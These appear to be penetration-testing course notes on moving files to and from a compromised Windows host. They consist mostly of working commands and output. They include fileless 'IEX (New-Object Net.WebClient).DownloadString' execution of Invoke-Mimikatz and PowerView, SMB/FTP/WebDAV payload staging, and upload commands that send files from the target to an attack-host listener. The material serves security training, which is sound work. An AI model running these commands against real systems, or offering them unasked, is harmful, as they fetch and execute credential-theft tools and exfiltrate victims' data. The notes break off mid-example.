### File Transfers

```
### Real-world possible case: 

# ...
# During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. 
# We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. 
# We attempt to use PowerShell to transfer PowerUp.ps1 (a PowerShell script to enumerate privilege escalation vectors), 
# but PowerShell is blocked by the Application Control Policy. 
# We perform our local enumeration manually and find that we have SeImpersonatePrivilege. 
# We need to transfer a binary to our target machine to escalate privileges using the PrintSpoofer tool. 
# We then try to use Certutil to download the file we compiled ourselves directly from our own GitHub, 
# but the organization has strong web content filtering in place. 
# We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. 
# Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). # We tried to use the Impacket smbserver tool to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. 
# We used this file transfer method to successfully copy the binary onto our target machine 
# and accomplish our goal of escalating privileges to an administrator-level user.
# ...

```
### Introduction

Example of advanced persistent threat (APT):
[Microsoft Astaroth Attack](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)
[Scheme](https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png)

```
# The Windows operating system has evolved over the past few years, and new versions come with different utilities for file transfer operations. 
# Understanding file transfer in Windows can help both attackers and defenders. 
# ttackers can use various file transfer methods to operate and avoid being caught. 
# Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised. 
```

## Download Operations

```
# We have access to the machine MS02, and we need to download a file from our Pwnbox machine. 
# Let's see how we can accomplish this using multiple File Download methods.
```

### PowerShell Base64 Encode & Decode

```
# Depending on the file size we want to transfer, we can use different methods that do not require network communication. 
# If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, 
# decoding the file in the original content. 
# Let's see how we can do this with PowerShell.

# We can use md5sum, a program that calculates and verifies 128-bit MD5 checksums. 
# The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. 
# Let's attempt to transfer a sample ssh key. It can be anything else, from our Pwnbox to the Windows target.

md5sum id_rsa                  # Check SSH Key MD5 Hash on localhost
cat id_rsa |base64 -w 0;echo   # Encode SSH Key to Base64 on localhost
output:
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KY...

# We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.
PS C:\file-transfer> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KY...="))

# Finally, we can confirm if the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does.
PS C:\file-transfer> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
output:
Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa

# Note: While this method is convenient, it's not always possible to use. 
# Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. 
# Also, a web shell may error if you attempt to send extremely large strings.
```

### PowerShell Web Downloads

```
# Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. 
# Leveraging these transportation methods for file transfer operations is very convenient. 
# Still, defenders can use Web filtering solutions to prevent access to specific website categories, 
# block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.

# PowerShell offers many file transfer options. 
# In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP.
# The following table describes WebClient methods for downloading data from a resource:

Method	              Description

OpenRead              # Returns the data from a resource as a Stream.
OpenReadAsync         # Returns the data from a resource without blocking the calling thread.
DownloadData	      # Downloads data from a resource and returns a Byte array.
DownloadDataAsync	  # Downloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFile	      # Downloads data from a resource to a local file.
DownloadFileAsync	  # Downloads data from a resource to a local file without blocking the calling thread.
DownloadString	      # Downloads a String from a resource and returns a String.
DownloadStringAsync   # Downloads a String from a resource without blocking the calling thread.

```

### PowerShell DownloadFile Method

```
# We can specify the class name Net.WebClient and the method DownloadFile with the parameters 
# corresponding to the URL of the target file to download and the output file name.

# File Download:

PS C:\file-transfer> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')   #  Example pattern of download file
PS C:\file-transfer> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\file-transfer> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')  #  Example pattern of download file async
PS C:\file-transfer> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

### PowerShell DownloadString - Fileless Method

```
# As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. 
# PowerShell can also be used to perform fileless attacks. 
# Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.


PS C:\file-transfer> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

# IEX also accepts pipeline input:
PS C:\file-transfer> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### PowerShell Invoke-WebRequest

```
# From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. 
# You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.

PS C:\file-transfer> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

### Common Errors with PowerShell

```
# There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
# This can be bypassed using the parameter -UseBasicParsing.
```

```
PS C:\file-transfer> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.

```
# Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. 
# We can bypass that error with the following command:
```

```
PS C:\file-transfer> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

### SMB Downloads

```
# The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. 
# It enables applications and users to transfer files to and from remote servers.

sudo impacket-smbserver share -smb2support /tmp/smbshare     # Create the SMB Server

# To download a file from the SMB server to the current working directory, we can use the following command:
# (Target Win host <- our linux localhost with runing SMB server)

C:\file-transfer> copy \\192.168.220.133\share\nc.exe        # Copy file win<-linux  
output:
1 file(s) copied.

# New versions of Windows block unauthenticated guest access, as we can see in the following command:

C:\file-transfer> copy \\192.168.220.133\share\nc.exe        # Copy file win<-linux with error
output:
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.

# To transfer files in this scenario, we can set a username and password using our Impacket SMB server 
# and mount the SMB server on our windows target machine:

sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test      # config server with user and pass
C:\file-transfer> net use n: \\192.168.220.133\share /user:test test                    # Mount the SMB Server with Username and Password
output:
The command completed successfully.

C:\file-transfer> copy n:\nc.exe                             # Copy file win<-linux    
output:
1 file(s) copied.
```

### FTP Downloads

```
# Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. 
# We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.
# We can configure an FTP Server in our attack host using Python3 pyftpdlib module.

sudo pip3 install pyftpdlib            # Installing the FTP Server Python3 Module
sudo python3 -m pyftpdlib --port 21    # Start FTP server on port 21

# After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell Net.WebClient.

PS C:\file-transfer> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

# When we get a shell on a remote machine, we may not have an interactive shell. 
# If that's the case, we can create an FTP command file to download a file. 
# First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

C:\file-transfer> echo open 192.168.49.128 > ftpcommand.txt
C:\file-transfer> echo USER anonymous >> ftpcommand.txt
C:\file-transfer> echo binary >> ftpcommand.txt
C:\file-transfer> echo GET file.txt >> ftpcommand.txt
C:\file-transfer> echo bye >> ftpcommand.txt
C:\file-transfer> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\file-transfer>more file.txt
This is a test file
```

## Upload Operations

### PowerShell Base64 Encode & Decode

```
# We saw how to decode a base64 string using Powershell. 
# Now, let's do the reverse operation and encode a file so we can decode it on our attack host.

PS C:\file-transfer> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
output:
IyBDb3B5cmlnaHQ...=

PS C:\file-transfer> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
output:
Hash
----
3688374325B992DEF12793500307566D

# We copy this content and paste it into our attack host, use the base64 command to decode it, 
# and use the md5sum application to confirm the transfer happened correctly.

echo IyBDb3B5cmlnaHQ...= | base64 -d > hosts

md5sum hosts 
output:
3688374325b992def12793500307566d  hosts
```

### PowerShell Web Uploads

```
# PowerShell doesn't have a built-in function for upload operations, 
# but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. 
# We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.
# For our web server, we can use uploadserver, an extended module of the Python HTTP.server module, which includes a file upload page.

pip3 install uploadserver       # Installing a Configured WebServer with Upload
python3 -m uploadserver         # Start web server
```

[PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)
```
# Now we can use a PowerShell script PSUpload.ps1 which uses Invoke-RestMethod to perform the upload operations. 
# The script accepts two parameters -File, which we use to specify the file path, 
# and -Uri, the server URL where we'll upload our file. 
# Let's attempt to upload the host file from our Windows host.

PS C:\file-transfer> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\file-transfer> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
output:
[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

### PowerShell Base64 Web Upload

```
# Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. 
# We use Netcat to listen in on a port we specify and send the file as a POST request. 
# Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

PS C:\file-transfer> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\file-transfer> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

# We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.

nc -lvnp 8000                                # Start nc listen on 8000
output:
listening on [any] 8000 ...

echo <base64> | base64 -d -w 0 > hosts       # Decode received base64 value from Win host and POST method
```

### SMB Uploads

```
# We previously discussed that companies usually allow outbound traffic using HTTP (TCP/80) and HTTPS (TCP/443) protocols. 
# Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.

# An alternative is to run SMB over HTTP with WebDav. 
# WebDAV (RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. 
# The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.

sudo pip3 install wsgidav cheroot                                               # Configuring WebDav Server, install deps
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous              # Start the WebDav Python module

# Now we can attempt to connect to the share using the DavWWWRoot directory.
C:\file-transfer> dir \\192.168.49.128\DavWWWRoot                               # Connecting to the Webdav Share
output:

C:\file-transfer> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\       # Uploading Files using SMB

# Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
```

### FTP Uploads

```
# Uploading files using FTP is very similar to downloading files. 
# We can use PowerShell or the FTP client to complete the operation. 
# Before we start our FTP Server using the Python module pyftpdlib, 
# we need to specify the option --write to allow clients to upload files to our attack host.

sudo python3 -m pyftpdlib --port 21 --write      # Start FTP server on localhost

# PowerShell Upload File

PS C:\file-transfer> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

# Create a Command File for the FTP Client to Upload a File (in case of web or non-interactive shell on remote)

C:\file-transfer> echo open 192.168.49.128 > ftpcommand.txt
C:\file-transfer> echo USER anonymous >> ftpcommand.txt
C:\file-transfer> echo binary >> ftpcommand.txt
C:\file-transfer> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
